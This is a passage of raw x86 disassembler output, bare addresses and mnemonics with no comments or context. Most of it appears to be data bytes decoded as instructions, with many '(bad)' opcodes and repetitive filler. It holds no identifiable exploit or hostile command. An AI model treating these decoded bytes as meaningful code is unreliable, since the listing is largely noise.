  408957:	add    BYTE PTR [ebx+0x2b0a9808],dl
  40895d:	add    DWORD PTR ds:0x1000000,esp
  408963:	add    al,dl
  408965:	sldt   WORD PTR [eax]
  408968:	add    DWORD PTR [eax],eax
  40896a:	ror    BYTE PTR [edi],1
  40896c:	add    BYTE PTR [eax],al
  40896e:	add    DWORD PTR [eax],eax
  408970:	ror    BYTE PTR [edi],cl
  408972:	add    BYTE PTR [eax],al
  408974:	add    al,BYTE PTR [eax]
  408976:	fimul  WORD PTR [edi]
  408978:	add    BYTE PTR [eax],al
  40897a:	add    DWORD PTR [eax],eax
  40897c:	ror    BYTE PTR [edi],cl
  40897e:	add    BYTE PTR [eax],al
  408980:	add    al,BYTE PTR [eax]
  408982:	loop   0x408993
  408984:	add    BYTE PTR [eax],al
  408986:	add    eax,DWORD PTR [eax]
  408988:	call   0x140899c
  40898d:	add    ah,ch
  40898f:	sldt   WORD PTR [eax]
  408992:	add    DWORD PTR [eax],eax
  408994:	hlt    
  408995:	sldt   WORD PTR [eax]
  408998:	add    al,BYTE PTR [eax]
  40899a:	test   DWORD PTR [edi],0x30000
  4089a0:	pop    es
  4089a1:	adc    BYTE PTR [eax],al
  4089a3:	add    BYTE PTR [ecx],al
  4089a5:	add    ah,dh
  4089a7:	sldt   WORD PTR [eax]
  4089aa:	add    al,BYTE PTR [eax]
  4089ac:	test   DWORD PTR [edi],0x30000
  4089b2:	pop    es
  4089b3:	adc    BYTE PTR [eax],al
  4089b5:	add    BYTE PTR [eax+eax*1],al
  4089b8:	sbb    edx,DWORD PTR [eax]
  4089ba:	add    BYTE PTR [eax],al
  4089bc:	add    DWORD PTR [eax],eax
  4089be:	sub    DWORD PTR [eax],edx
  4089c0:	add    BYTE PTR [eax],al
  4089c2:	add    al,BYTE PTR [eax]
  4089c4:	test   DWORD PTR [edi],0x10000
  4089ca:	xor    al,0x10
  4089cc:	add    BYTE PTR [eax],al
  4089ce:	add    DWORD PTR [eax],eax
  4089d0:	cmp    DWORD PTR [eax],edx
  4089d2:	add    BYTE PTR [eax],al
  4089d4:	add    al,BYTE PTR [eax]
  4089d6:	inc    ebx
  4089d7:	adc    BYTE PTR [edx],al
  4089d9:	add    BYTE PTR [ebx],al
  4089db:	add    BYTE PTR [esi+0x10],al
  4089de:	add    al,BYTE PTR [eax]
  4089e0:	add    al,0x0
  4089e2:	loop   0x4089f3
  4089e4:	add    al,BYTE PTR [eax]
  4089e6:	add    eax,0x20ff400
  4089eb:	add    BYTE PTR [esi],al
  4089ed:	add    BYTE PTR [eax+edx*1+0x70002],al
  4089f4:	xchg   esp,eax
  4089f5:	adc    BYTE PTR [eax],al
  4089f7:	add    BYTE PTR [ecx],al
  4089f9:	add    BYTE PTR [ecx],bh
  4089fb:	adc    BYTE PTR [eax],al
  4089fd:	add    BYTE PTR [edx],al
  4089ff:	add    BYTE PTR [ebx+0x10],al
  408a02:	add    al,BYTE PTR [eax]
  408a04:	add    eax,DWORD PTR [eax]
  408a06:	inc    esi
  408a07:	adc    BYTE PTR [eax],al
  408a09:	add    BYTE PTR [ecx],al
  408a0b:	add    BYTE PTR [ebx+0x10],al
  408a0e:	add    BYTE PTR [eax],al
  408a10:	add    DWORD PTR [eax],eax
  408a12:	inc    ebx
  408a13:	adc    BYTE PTR [eax],al
  408a15:	add    BYTE PTR [ecx],al
  408a17:	add    BYTE PTR [ebx+0x10],al
  408a1a:	add    BYTE PTR [eax],al
  408a1c:	add    DWORD PTR [eax],eax
  408a1e:	fimul  WORD PTR [edi]
  408a20:	add    BYTE PTR [eax],al
  408a22:	add    DWORD PTR [eax],eax
  408a24:	call   0x2408a38
  408a29:	add    BYTE PTR [ebx+0x1000010],ah
  408a2f:	add    BYTE PTR [edi+0x1000010],ah
  408a35:	add    BYTE PTR [esi-0x1bff6ef0],ch
  408a3b:	add    ecx,DWORD PTR [edi]
  408a3d:	add    DWORD PTR [ecx+0x3d03e400],ebx
  408a43:	add    DWORD PTR [ecx+0x4203e400],esp
  408a49:	add    DWORD PTR [ecx+0x4203e400],ebp
  408a4f:	add    DWORD PTR [ecx+0x3d03e400],esi
  408a55:	add    DWORD PTR [ecx+0x3d03e400],edi
  408a5b:	add    ecx,eax
  408a5d:	add    ah,ah
  408a5f:	add    edi,DWORD PTR ds:0xe400c901
  408a65:	add    edi,DWORD PTR ds:0xe400d101
  408a6b:	add    edi,DWORD PTR ds:0xe400d901
  408a71:	add    edi,DWORD PTR ds:0xe400e101
  408a77:	add    edi,DWORD PTR ds:0xe400e901
  408a7d:	add    edi,DWORD PTR ds:0xe400f101
  408a83:	add    edi,DWORD PTR ds:0xe400f901
  408a89:	add    edi,DWORD PTR ds:0xe4010101
  408a8f:	add    edi,DWORD PTR ds:0xe4010901
  408a95:	add    eax,DWORD PTR [edx+0x1]
  408a98:	adc    DWORD PTR [ecx],eax
  408a9a:	in     al,0x3
  408a9c:	cmp    eax,0xe4011901
  408aa1:	add    eax,DWORD PTR [edi+0x1]
  408aa4:	and    DWORD PTR [ecx],eax
  408aa6:	in     al,0x3
  408aa8:	(bad)  
  408aaa:	sub    DWORD PTR [ecx],eax
  408aac:	in     al,0x3
  408aae:	dec    ebp
  408aaf:	add    DWORD PTR [ecx],edi
  408ab1:	add    esp,esp
  408ab3:	add    edx,DWORD PTR [ecx+eax*1+0x49]
  408ab7:	add    esp,esp
  408ab9:	add    ebx,DWORD PTR [ebx+0x1]
  408abc:	push   ecx
  408abd:	add    DWORD PTR [esi+0x51007213],esp
  408ac3:	add    DWORD PTR [esi+0x51009613],esp
  408ac9:	add    DWORD PTR [eax+0x11009613],esi
  408acf:	add    BYTE PTR [esi+0x41020213],dh
  408ad5:	add    ch,al
  408ad7:	adc    eax,DWORD PTR [edi]
  408ad9:	add    bl,BYTE PTR [ecx+0x1]
  408adc:	add    edx,DWORD PTR [edx+ecx*1]
  408adf:	add    BYTE PTR [ecx+0x1],ah
  408ae2:	sbb    al,0x14
  408ae4:	or     al,BYTE PTR [eax]
  408ae6:	adc    DWORD PTR [eax],eax
  408ae8:	and    dl,BYTE PTR [ebx+ecx*1]
  408aeb:	add    al,BYTE PTR [ecx+0x0]
  408aee:	into   
  408aef:	push   es
  408af0:	pop    es
  408af1:	add    dl,BYTE PTR [ecx]
  408af3:	add    BYTE PTR [edi],ch
  408af5:	adc    al,0x11
  408af7:	add    ch,BYTE PTR [ecx+0x1]
  408afa:	dec    eax
  408afb:	adc    al,0x15
  408afd:	add    bh,BYTE PTR [ecx+0x1]
  408b00:	jo     0x408b16
  408b02:	sbb    eax,0xa6015102
  408b07:	adc    esp,DWORD PTR ds:0xa0015902
  408b0d:	adc    al,0xa
  408b0f:	add    BYTE PTR [ecx+0x0],ah
  408b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b13:	adc    al,0x7
  408b15:	add    ah,BYTE PTR [ecx+0x1]
  408b18:	rcl    BYTE PTR [edx+ebp*1],1
  408b1b:	add    bl,BYTE PTR [ecx+0x1]
  408b1e:	xlat   BYTE PTR ds:[ebx]
  408b1f:	adc    al,0xa
  408b21:	add    BYTE PTR [ecx+0x1],ah
  408b24:	loope  0x408b3a
  408b26:	xor    eax,DWORD PTR [edx]
  408b28:	jns    0x408b2b
  408b2a:	out    dx,eax
  408b2b:	adc    al,0x38
  408b2d:	add    bl,BYTE PTR [ecx+0x1]
  408b30:	jnp    0x408b3f
  408b32:	or     al,BYTE PTR [eax]
  408b34:	adc    DWORD PTR [eax],eax
  408b36:	mov    bl,0x5
  408b38:	pop    es
  408b39:	add    ah,BYTE PTR [ecx+0x1]
  408b3c:	add    DWORD PTR ds:0x159023e,edx
  408b42:	mov    bl,0xb
  408b44:	or     al,BYTE PTR [eax]
  408b46:	adc    DWORD PTR [eax],eax
  408b48:	cld    
  408b49:	pop    es
  408b4a:	inc    edx
  408b4b:	add    cl,BYTE PTR [ecx+0x20150c00]
  408b51:	add    DWORD PTR [ecx+0x48153001],ebx
  408b57:	add    ah,BYTE PTR [ecx+0x4e155801]
  408b5d:	add    ah,BYTE PTR [ecx+0x1]
  408b60:	popa   
  408b61:	adc    eax,0x610255
  408b66:	push   0x11025f15
  408b6b:	add    bh,ch
  408b6d:	pop    es
  408b6e:	inc    edx
  408b6f:	add    dh,BYTE PTR [ecx-0x6bea79ff]
  408b75:	add    bh,BYTE PTR [ecx+0xa15ae01]
  408b7b:	add    BYTE PTR [ecx-0x65eb2fff],dh
  408b81:	add    bl,BYTE PTR [ecx+0x1]
  408b84:	rcl    DWORD PTR ds:0x161000a,0xcd
  408b8b:	adc    eax,0x16102a0
  408b90:	fst    DWORD PTR ds:0x1610207
  408b96:	jecxz  0x408bad
  408b98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b99:	add    ah,BYTE PTR [ecx]
  408b9b:	add    BYTE PTR [esi+0x61020213],dh
  408ba1:	add    dl,ch
  408ba3:	adc    eax,0x1902bd
  408ba8:	cmp    al,0x16
  408baa:	enter  0xc02,0x0
  408bae:	push   esi
  408baf:	push   ss
  408bb0:	fadd   QWORD PTR [edx]
  408bb2:	adc    al,0x0
  408bb4:	fs push ss
  408bb6:	out    dx,eax
  408bb7:	add    ah,BYTE PTR [ecx]
  408bb9:	add    BYTE PTR [eax+0x16],dh
  408bbc:	ds add dl,cl
  408bbf:	add    DWORD PTR [ecx+0x16],edi
  408bc2:	add    ah,BYTE PTR ds:[ecx]
  408bc5:	add    BYTE PTR [ecx-0x2efdc1ea],al
  408bcb:	add    DWORD PTR [ebx+0x61020716],ecx
  408bd1:	add    DWORD PTR [esi+edx*1+0x16102f4],edx
  408bd8:	popf   
  408bd9:	push   ss
  408bda:	stc    
  408bdb:	add    ah,BYTE PTR [ecx+0x1]
  408bde:	jecxz  0x408bf5
  408be0:	inc    DWORD PTR [edx]
  408be2:	jmp    0x115751e8
  408be7:	add    dh,cl
  408be9:	add    ebx,ebx
  408beb:	push   ss
  408bec:	(bad)  
  408bee:	sub    DWORD PTR [eax],eax
  408bf0:	icebp  
  408bf1:	push   ss
  408bf2:	sbb    BYTE PTR [ebx],al
  408bf4:	sbb    al,0x0
  408bf6:	push   esi
  408bf7:	push   ss
  408bf8:	fadd   QWORD PTR [edx]
  408bfa:	and    al,0x0
  408bfc:	fs push ss
  408bfe:	out    dx,eax
  408bff:	add    cl,BYTE PTR [ecx+0x20170a00]
  408c05:	add    DWORD PTR [ecx+0x1],esp
  408c08:	pop    ds
  408c09:	pop    ss
  408c0a:	inc    ebp
  408c0b:	add    esp,DWORD PTR [ecx+0x1]
  408c0e:	popf   
  408c0f:	push   ss
  408c10:	hlt    
  408c11:	add    bh,BYTE PTR [ecx+0x1]
  408c14:	daa    
  408c15:	pop    ss
  408c16:	dec    ebx
  408c17:	add    esp,DWORD PTR [ecx+0x0]
  408c1a:	jmp    0x6e02:0x11035115
  408c21:	pop    ss
  408c22:	pop    esi
  408c23:	add    edx,DWORD PTR [ecx]
  408c25:	add    al,BYTE PTR [eax+0x11035e17]
  408c2b:	add    cl,BYTE PTR [esi+0x19035e17]
  408c31:	add    ah,ah
  408c33:	add    edi,DWORD PTR ds:0xb5001101
  408c39:	pop    ss
  408c3a:	adc    DWORD PTR [edx],eax
  408c3c:	and    DWORD PTR [edx],eax
  408c3e:	ficom  DWORD PTR [edi]
  408c40:	ins    BYTE PTR es:[edi],dx
  408c41:	add    ebp,DWORD PTR [ecx]
  408c43:	add    ah,ah
  408c45:	add    ecx,DWORD PTR [edi]
  408c47:	add    DWORD PTR [ecx],esp
  408c49:	add    dh,bl
  408c4b:	pop    ss
  408c4c:	jl     0x408c51
  408c4e:	mov    DWORD PTR [eax],eax
  408c50:	add    eax,0x89012018
  408c55:	add    BYTE PTR [edx],bl
  408c57:	sbb    BYTE PTR [edx+0x36022103],al
  408c5d:	sbb    BYTE PTR [edi+0x60015103],al
  408c63:	sbb    BYTE PTR [ebp+0x73023103],cl
  408c69:	sbb    BYTE PTR [esi],bh
  408c6b:	add    dh,BYTE PTR [ecx]
  408c6d:	add    al,BYTE PTR [eax+0x21038d18]
  408c73:	add    al,BYTE PTR ds:0x89038218
  408c79:	add    BYTE PTR [edx+0x39039318],dl
  408c7f:	add    bl,BYTE PTR [edi+0x39023e18]
  408c85:	add    ch,BYTE PTR [edi-0x76fdc1e8]
  408c8b:	add    ah,ah
  408c8d:	add    edi,DWORD PTR ds:0xe4024101
  408c93:	add    ecx,DWORD PTR [edi]
  408c95:	add    DWORD PTR [ecx+0x2],edx
  408c98:	sbb    DWORD PTR [ecx],0xffffff9d
  408c9b:	add    ebp,DWORD PTR [ecx+0x2]
  408c9e:	mov    bl,0x19
  408ca0:	jb     0x408ca2
  408ca2:	jno    0x408ca6
  408ca4:	in     al,0x3
  408ca6:	lmsw   WORD PTR [ecx+0x2]
  408caa:	enter  0xa719,0x3
  408cae:	jns    0x408cb2
  408cb0:	fcomp  DWORD PTR [ecx]
  408cb2:	lods   al,BYTE PTR ds:[esi]
  408cb3:	add    esp,DWORD PTR [ecx+0x1]
  408cb6:	out    dx,eax
  408cb7:	sbb    DWORD PTR [ecx-0xafe9efd],esi
  408cbd:	sbb    DWORD PTR [eax-0x1cfe9efd],edi
  408cc3:	adc    eax,0x16103bd
  408cc8:	call   FWORD PTR [ecx]
  408cca:	ret    
  408ccb:	add    esi,DWORD PTR [ecx+0x2]
  408cce:	push   esi
  408ccf:	push   ss
  408cd0:	retf   
  408cd1:	add    ebp,ecx
  408cd3:	add    DWORD PTR [esi+edx*1-0x2f],esp
  408cd7:	add    ecx,DWORD PTR [ecx]
  408cd9:	add    BYTE PTR [eax+0x15],bl
  408cdc:	pop    es
  408cdd:	add    ah,BYTE PTR [ecx+0x1]
  408ce0:	or     bl,BYTE PTR [edx]
  408ce2:	inc    ebp
  408ce3:	add    eax,DWORD PTR [ecx-0x2ae5d0fe]
  408ce9:	add    edx,DWORD PTR [ecx-0x23e594fe]
  408cef:	add    ebx,DWORD PTR [ecx-0x2ae5d0fe]
  408cf5:	add    esp,DWORD PTR [ecx-0x1ae546fe]
  408cfb:	add    esi,DWORD PTR [ecx+0x2]
  408cfe:	rcr    BYTE PTR [edx],1
  408d00:	add    dh,BYTE PTR ds:[ecx+0x2]
  408d04:	ficomp DWORD PTR [edx]
  408d06:	out    dx,al
  408d07:	add    ebx,DWORD PTR [ecx+0x0]
  408d0a:	loope  0x408d26
  408d0c:	cmc    
  408d0d:	add    ebx,DWORD PTR [ecx]
  408d0f:	add    ch,cl
  408d11:	sbb    al,BYTE PTR [edi]
  408d13:	add    bh,BYTE PTR [ecx+0x2]
  408d16:	cmc    
  408d17:	sbb    ch,BYTE PTR [ebx+eax*1+0x2c]
  408d1b:	add    ah,ah
  408d1d:	add    ebx,DWORD PTR [ebx+0x1]
  408d20:	sub    al,0x0
  408d22:	enter  0xa19,0x4
  408d26:	sub    al,0x0
  408d28:	push   cs
  408d29:	sbb    edx,DWORD PTR [edx]
  408d2b:	add    al,0x61
  408d2d:	add    BYTE PTR [edx],bl
  408d2f:	sbb    ebx,DWORD PTR [ebx]
  408d31:	add    al,0x61
  408d33:	add    BYTE PTR [ecx],dh
  408d35:	sbb    esp,DWORD PTR [ebx]
  408d37:	add    al,0xa9
  408d39:	add    bl,BYTE PTR [eax+0x1b]
  408d3c:	sub    al,0x4
  408d3e:	test   eax,0x9a19ff02
  408d43:	add    ah,BYTE PTR [ecx+0x0]
  408d46:	sbb    BYTE PTR [ebx],0x32
  408d49:	add    al,0x61
  408d4b:	add    BYTE PTR [edi+0x61043c1b],dl
  408d51:	add    BYTE PTR [esi+0x6104421b],ch
  408d57:	add    dl,cl
  408d59:	sbb    eax,DWORD PTR [edx+0x4]
  408d5c:	jns    0x408d60
  408d5e:	jmp    0x408d7b
  408d60:	sub    eax,DWORD PTR [ecx]
  408d62:	popa   
  408d63:	add    al,bh
  408d65:	sbb    ecx,DWORD PTR [edx+0x4]
  408d68:	dec    ecx
  408d69:	add    BYTE PTR [ecx],al
  408d6b:	sbb    al,0x52
  408d6d:	add    al,0x49
  408d6f:	add    BYTE PTR [eax],dl
  408d71:	sbb    al,0x5d
  408d73:	add    al,0x49
  408d75:	add    BYTE PTR [ebx+0x29046b05],ah
  408d7b:	add    BYTE PTR [edi],ah
  408d7d:	sbb    al,0x70
  408d7f:	add    al,0x29
  408d81:	add    BYTE PTR [edi],bh
  408d83:	sbb    al,0x77
  408d85:	add    al,0x49
  408d87:	add    BYTE PTR [ecx+0x1c],dl
  408d8a:	jg     0x408d90
  408d8c:	sbb    DWORD PTR [eax],eax
  408d8e:	mov    edx,DWORD PTR [esi]
  408d90:	pop    es
  408d91:	add    dl,BYTE PTR [ecx+0x1]
  408d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d95:	adc    eax,DWORD PTR [ebp+0x74003404]
  408d9b:	sbb    al,0x93
  408d9d:	add    al,0x3c
  408d9f:	add    BYTE PTR [esi+0x16],dl
  408da2:	test   al,0x4
  408da4:	inc    esp
  408da5:	add    BYTE PTR [esi+edx*1-0x11],ah
  408da9:	add    al,BYTE PTR [eax+eax*1-0x3a]
  408dad:	push   ss
  408dae:	adc    DWORD PTR [edx],eax
  408db0:	sbb    DWORD PTR [edx],eax
  408db2:	mov    BYTE PTR [edi*4-0x64ffe6fc],bl
  408db9:	sbb    al,0x4e
  408dbb:	add    eax,0x13a60151
  408dc0:	push   ebx
  408dc1:	add    eax,0x1b0e0034
  408dc6:	adc    al,BYTE PTR [ecx+esi*2]
  408dc9:	add    BYTE PTR [edi+0x51057d1c],ch
  408dcf:	add    ah,ah
  408dd1:	add    eax,DWORD PTR [ebp+eax*1+0x1cc50071]
  408dd8:	mov    eax,DWORD PTR ds:0x1cde0071
  408dde:	mov    eax,DWORD PTR ds:0x1cf40051
  408de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408de5:	add    eax,0x1cf90051
  408dea:	or     al,BYTE PTR [eax]
  408dec:	push   ecx
  408ded:	add    BYTE PTR [edx],al
  408def:	sbb    eax,0x59000a
  408df4:	push   es
  408df5:	sbb    eax,0x59010f
  408dfa:	sbb    bl,BYTE PTR ds:0x6905ba
  408e00:	and    eax,0x4c05cf1d
  408e05:	add    BYTE PTR [esi+0x16],dl
  408e08:	fadd   QWORD PTR [edx]
  408e0a:	push   esp
  408e0b:	add    BYTE PTR [esi+edx*1-0x11],ah
  408e0f:	add    dh,BYTE PTR [eax+eax*1]
  408e12:	cmp    ebx,DWORD PTR ds:0x34040a
  408e18:	in     al,0x3
  408e1a:	cmc    
  408e1b:	add    eax,0x3e40009
  408e20:	xsetbv 
  408e23:	add    ah,ah
  408e25:	add    eax,DWORD PTR [edi+0x1]
  408e28:	fld    DWORD PTR [edx]
  408e2a:	in     al,0x3
  408e2c:	sidtd  [ecx]
  408e2f:	add    BYTE PTR [ebx-0x1ef9bee3],ch
  408e35:	add    dl,dl
  408e37:	sbb    eax,0x2e10647
  408e3c:	in     eax,dx
  408e3d:	sbb    eax,0x810650
  408e42:	in     al,0x3
  408e44:	push   esi
  408e45:	push   es
  408e46:	add    DWORD PTR [eax],0x6631dfa
  408e4c:	stc    
  408e4d:	add    ah,ah
  408e4f:	add    ebp,DWORD PTR [edx+0x6]
  408e52:	push   cs
  408e53:	add    BYTE PTR [eax+eax*1],al
  408e56:	or     eax,0x8000e00
  408e5b:	add    BYTE PTR [edx],bl
  408e5d:	add    BYTE PTR [esi],cl
  408e5f:	add    BYTE PTR [eax+eax*1],cl
  408e62:	xor    DWORD PTR [eax],eax
  408e64:	push   cs
  408e65:	add    BYTE PTR [eax],dl
  408e67:	add    BYTE PTR [eax+0x0],al
  408e6a:	push   cs
  408e6b:	add    BYTE PTR [eax+eax*1],dl
  408e6e:	pop    ebp
  408e6f:	add    BYTE PTR [ecx],ch
  408e71:	add    BYTE PTR [ebx+0x5],bh
  408e74:	jno    0x408e7c
  408e76:	add    BYTE PTR cs:[ebx],bh
  408e79:	add    BYTE PTR [esi+0x43002e06],bh
  408e7f:	add    bl,dl
  408e81:	push   es
  408e82:	add    BYTE PTR cs:[ebx+0x0],cl
  408e86:	out    dx,al
  408e87:	push   es
  408e88:	add    BYTE PTR cs:[ebx+0x2e0b0700],dh
  408e8f:	add    BYTE PTR [ebx+0x0],ah
  408e92:	dec    eax
  408e93:	pop    es
  408e94:	add    BYTE PTR cs:[ebx],dl
  408e97:	add    BYTE PTR [edx+0x6],bh
  408e9a:	add    BYTE PTR cs:[ebx],bl
  408e9d:	add    BYTE PTR [edx+0x23002e06],dh
  408ea3:	add    BYTE PTR [eax+0x2b002e06],bh
  408ea9:	add    BYTE PTR [esi+0x33002e06],bh
  408eaf:	add    BYTE PTR [esi+0x53002e06],bh
  408eb5:	add    BYTE PTR [edi+eax*1],dl
  408eb8:	add    BYTE PTR cs:[ebx+0x2e06b800],al
  408ebf:	add    BYTE PTR [ebx+0x2e067100],ch
  408ec5:	add    BYTE PTR [ebx+0x0],dh
  408ec8:	pop    edx
  408ec9:	pop    es
  408eca:	add    BYTE PTR cs:[ebx+0x0],bh
  408ece:	push   0x6b002e07
  408ed3:	add    BYTE PTR [eax+0x7],cl
  408ed6:	add    BYTE PTR cs:[ebx+0x2e077300],cl
  408edd:	add    BYTE PTR [ebx+0x2e079e00],dl
  408ee3:	add    BYTE PTR [ebx+0x490ae800],bl
  408ee9:	add    BYTE PTR [ebx+0x5],bh
  408eec:	jno    0x408ef4
  408eee:	arpl   WORD PTR [eax],ax
  408ef0:	sub    eax,DWORD PTR [ebx]
  408ef2:	ja     0x408ef7
  408ef4:	arpl   WORD PTR [eax],ax
  408ef6:	inc    ebx
  408ef7:	add    eax,0x630600
  408efc:	dec    ebx
  408efd:	add    eax,0x830377
  408f02:	sub    eax,DWORD PTR [ebx]
  408f04:	ja     0x408f09
  408f06:	inc    eax
  408f07:	add    ebx,eax
  408f09:	add    dh,BYTE PTR [edi+0x3]
  408f0c:	or     BYTE PTR [eax],al
  408f0e:	push   es
  408f0f:	add    BYTE PTR [eax],dl
  408f11:	or     eax,DWORD PTR [ecx]
  408f13:	add    BYTE PTR [eax+0x0],cl
  408f16:	add    BYTE PTR [eax],al
  408f18:	add    eax,0xac026c00
  408f1d:	add    al,BYTE PTR ds:0x40033203
  408f23:	add    esp,DWORD PTR [edx+0x3]
  408f26:	jno    0x408f2b
  408f28:	ret    
  408f29:	add    al,0x5a
  408f2b:	add    eax,0x592056f
  408f30:	fwait
  408f31:	add    eax,0x5af05a9
  408f36:	jmp    0x346ed40
  408f3b:	add    BYTE PTR [ecx],al
  408f3d:	add    BYTE PTR [eax],al
  408f3f:	add    bl,bh
  408f41:	add    ebp,DWORD PTR [edi]
  408f43:	add    DWORD PTR [eax],eax
  408f45:	add    BYTE PTR [eax+0x1340a],ch
  408f4b:	add    BYTE PTR [eax+0x1390a],dh
  408f51:	add    BYTE PTR [edx+ecx*1+0x139],bh
  408f58:	aad    0xa
  408f5a:	cmp    DWORD PTR [ecx],eax
  408f5c:	add    BYTE PTR [eax],al
  408f5e:	jmp    0x41c86d
  408f63:	add    bl,dh
  408f65:	or     bh,BYTE PTR [ecx]
  408f67:	add    DWORD PTR [eax],eax
  408f69:	add    BYTE PTR [esi],cl
  408f6b:	or     edi,DWORD PTR [ecx]
  408f6d:	add    DWORD PTR [eax],eax
  408f6f:	add    BYTE PTR [edx],dh
  408f71:	or     edi,DWORD PTR [ecx]
  408f73:	add    DWORD PTR [eax],eax
  408f75:	add    BYTE PTR [edx+0xb],cl
  408f78:	cmp    DWORD PTR [ecx],eax
  408f7a:	add    BYTE PTR [eax],al
  408f7c:	pop    ebp
  408f7d:	or     edi,DWORD PTR [ecx]
  408f7f:	add    DWORD PTR [eax],eax
  408f81:	add    BYTE PTR [ebx+ecx*1+0x39],bh
  408f85:	add    DWORD PTR [eax],eax
  408f87:	add    BYTE PTR [edx+0x1390b],bl
  408f8d:	add    BYTE PTR [ebx+0x1390b],dh
  408f93:	add    BYTE PTR [edi+0x1390b],bh
  408f99:	add    bl,cl
  408f9b:	or     edi,DWORD PTR [ecx]
  408f9d:	add    DWORD PTR [eax],eax
  408f9f:	add    al,dl
  408fa1:	or     edi,DWORD PTR [ecx]
  408fa3:	add    DWORD PTR [eax],eax
  408fa5:	add    dh,ah
  408fa7:	or     edi,DWORD PTR [ecx]
  408fa9:	add    DWORD PTR [eax],eax
  408fab:	add    BYTE PTR [eax],al
  408fad:	or     al,0x39
  408faf:	add    DWORD PTR [eax],eax
  408fb1:	add    BYTE PTR [esp+ecx*1],ah
  408fb4:	cmp    DWORD PTR [ecx],eax
  408fb6:	add    BYTE PTR [eax],al
  408fb8:	xor    cl,BYTE PTR [ecx+edi*1]
  408fbb:	add    DWORD PTR [eax],eax
  408fbd:	add    BYTE PTR [eax],bh
  408fbf:	or     al,0x39
  408fc1:	add    DWORD PTR [eax],eax
  408fc3:	add    BYTE PTR [edi],bh
  408fc5:	or     al,0x39
  408fc7:	add    DWORD PTR [eax],eax
  408fc9:	add    BYTE PTR [ecx+0xc],cl
  408fcc:	cmp    DWORD PTR [ecx],eax
  408fce:	add    BYTE PTR [eax],al
  408fd0:	push   esi
  408fd1:	or     al,0x39
  408fd3:	add    DWORD PTR [eax],eax
  408fd5:	add    BYTE PTR [ecx+0xc],ah
  408fd8:	cmp    DWORD PTR [ecx],eax
  408fda:	add    BYTE PTR [eax],al
  408fdc:	outs   dx,BYTE PTR ds:[esi]
  408fdd:	or     al,0x39
  408fdf:	add    DWORD PTR [eax],eax
  408fe1:	add    BYTE PTR [ebx+0xc],bh
  408fe4:	cmp    DWORD PTR [ecx],eax
  408fe6:	add    BYTE PTR [eax],al
  408fe8:	test   DWORD PTR [ecx+edi*1],ecx
  408feb:	add    DWORD PTR [eax],eax
  408fed:	add    BYTE PTR [esi+0x1390c],bl
  408ff3:	add    BYTE PTR [ebx+0x1390c],ch
  408ff9:	add    dl,cl
  408ffb:	or     al,0x39
  408ffd:	add    DWORD PTR [eax],eax
  408fff:	add    dl,dl
  409001:	or     al,0x39
  409003:	add    DWORD PTR [eax],eax
  409005:	add    al,dh
  409007:	or     al,0x39
  409009:	add    DWORD PTR [eax],eax
  40900b:	add    dh,bh
  40900d:	or     al,0x39
  40900f:	add    DWORD PTR [eax],eax
  409011:	add    BYTE PTR [edx],bl
  409013:	or     eax,0x139
  409018:	sub    cl,BYTE PTR ds:0x139
  40901e:	inc    edx
  40901f:	or     eax,0x139
  409024:	pop    ecx
  409025:	or     eax,0x139
  40902a:	pop    esp
  40902b:	or     eax,0x139
  409030:	bound  ecx,QWORD PTR ds:0x139
  409036:	jno    0x409045
  409038:	cmp    DWORD PTR [ecx],eax
  40903a:	add    BYTE PTR [eax],al
  40903c:	jnp    0x40904b
  40903e:	cmp    DWORD PTR [ecx],eax
  409040:	add    BYTE PTR [eax],al
  409042:	xchg   DWORD PTR ds:0x139,ecx
  409048:	nop
  409049:	or     eax,0x139
  40904e:	cwde   
  40904f:	or     eax,0x139
  409054:	stos   DWORD PTR es:[edi],eax
  409055:	or     eax,0x139
  40905a:	mov    edi,0x1390d
  40905f:	add    ah,cl
  409061:	or     eax,0x139
  409066:	(bad)  ds:0x139
  40906c:	repnz or eax,0x139
  409072:	or     eax,0x1390e
  409077:	add    BYTE PTR ds:0x1390e,ah
  40907d:	add    BYTE PTR [esi],bh
  40907f:	push   cs
  409080:	cmp    DWORD PTR [ecx],eax
  409082:	add    BYTE PTR [eax],al
  409084:	push   eax
  409085:	push   cs
  409086:	cmp    DWORD PTR [ecx],eax
  409088:	add    BYTE PTR [eax],al
  40908a:	ins    BYTE PTR es:[edi],dx
  40908b:	push   cs
  40908c:	cmp    DWORD PTR [ecx],eax
  40908e:	add    BYTE PTR [eax],al
  409090:	mov    BYTE PTR [esi],cl
  409092:	cmp    DWORD PTR [ecx],eax
  409094:	add    BYTE PTR [eax],al
  409096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409097:	push   cs
  409098:	cmp    DWORD PTR [ecx],eax
  40909a:	add    BYTE PTR [eax],al
  40909c:	mov    dl,0xe
  40909e:	cmp    DWORD PTR [ecx],eax
  4090a0:	add    BYTE PTR [eax],al
  4090a2:	ror    DWORD PTR [esi],0x39
  4090a5:	add    DWORD PTR [eax],eax
  4090a7:	add    ah,ah
  4090a9:	push   cs
  4090aa:	cmp    DWORD PTR [ecx],eax
  4090ac:	add    BYTE PTR [eax],al
  4090ae:	or     BYTE PTR [edi],cl
  4090b0:	cmp    DWORD PTR [ecx],eax
  4090b2:	add    BYTE PTR [eax],al
  4090b4:	sub    BYTE PTR [edi],cl
  4090b6:	cmp    DWORD PTR [ecx],eax
  4090b8:	add    BYTE PTR [eax],al
  4090ba:	push   edx
  4090bb:	(bad)  
  4090bd:	add    DWORD PTR [eax],eax
  4090bf:	add    BYTE PTR [ebx+0xf],ch
  4090c2:	cmp    DWORD PTR [ecx],eax
  4090c4:	add    BYTE PTR [eax],al
  4090c6:	jnp    0x4090d7
  4090c8:	cmp    DWORD PTR [ecx],eax
  4090ca:	add    BYTE PTR [eax],al
  4090cc:	or     DWORD PTR [edi],0x39
  4090cf:	add    DWORD PTR [eax],eax
  4090d1:	add    BYTE PTR [ebp+0x1390f],ah
  4090d7:	add    BYTE PTR [edi+0x1390f],ch
  4090dd:	add    BYTE PTR [edi+0x1390f],dh
  4090e3:	add    ah,al
  4090e5:	(bad)  
  4090e7:	add    DWORD PTR [edx],eax
  4090e9:	add    BYTE PTR [esi],dl
  4090eb:	add    BYTE PTR [ebx],al
  4090ed:	add    BYTE PTR [edx],al
  4090ef:	add    BYTE PTR [edi],dl
  4090f1:	add    BYTE PTR ds:0x18000100,al
